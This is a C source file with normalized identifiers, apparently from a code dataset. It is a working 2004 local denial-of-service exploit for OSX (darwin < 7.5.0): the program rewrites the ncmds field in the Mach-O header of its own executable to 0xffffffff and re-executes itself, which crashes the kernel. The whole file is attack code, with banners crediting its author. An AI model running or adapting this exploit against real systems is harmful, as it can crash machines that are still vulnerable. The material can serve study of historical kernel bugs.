
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int fpos_t ;
typedef int FILE ;


 int FUNC_0 (char*,char**) ;
 int FUNC_1 (int) ;
 int FUNC_2 (int *) ;
 int * FUNC_3 (char*,char*) ;
 int FUNC_4 (int *,int*) ;
 int FUNC_5 (int*,int,int,int *) ;
 int FUNC_6 (char*,...) ;
 int FUNC_7 (int) ;

int FUNC_8( int VAR_0, char * * VAR_1 )
{
  FILE * VAR_2;
  int VAR_3 = 0xffffffff;
  fpos_t VAR_4 = 0x10;
  FUNC_6( "-( nacho - 2004 DoS for OSX (darwin < 7.5.0 )-\n" );
  FUNC_6( "-( nemo pulltheplug org )-\n\n" );
  FUNC_6( "[+] Opening file for writing.\n" );
  if ( !( VAR_2 = FUNC_3( * VAR_1, "r+" ) ) )
  {
    FUNC_6( "[-] Error opening exe.\n" );
    FUNC_1( 1 );
  }
  FUNC_6( "[+] Seeking to ncmds.\n" );
  if ( ( FUNC_4( VAR_2, & VAR_4 ) ) == -1 )
  {
    FUNC_6( "[-] Error seeking to ncmds.\n" );
    FUNC_1( 1 );
  }
  FUNC_6( "[+] Changing ncmds to 0x%x.\n", VAR_3 );
  if ( FUNC_5( & VAR_3, 4, 1, VAR_2 ) < 1 )
  {
    FUNC_6( "[-] Error writing to file.\n" );
    FUNC_1( 1 );
  }
  FUNC_2( VAR_2 );
  FUNC_6( "[+] Re-executing with modified mach-o header.\n" );
  FUNC_7( 5 );
  if ( FUNC_0( * VAR_1, VAR_1 ) == -1 )
  {
    FUNC_6( "[-] Error executing %s, please run manually.\n", * VAR_1 );
    FUNC_1( 1 );
  }
  FUNC_1( 0 );
}
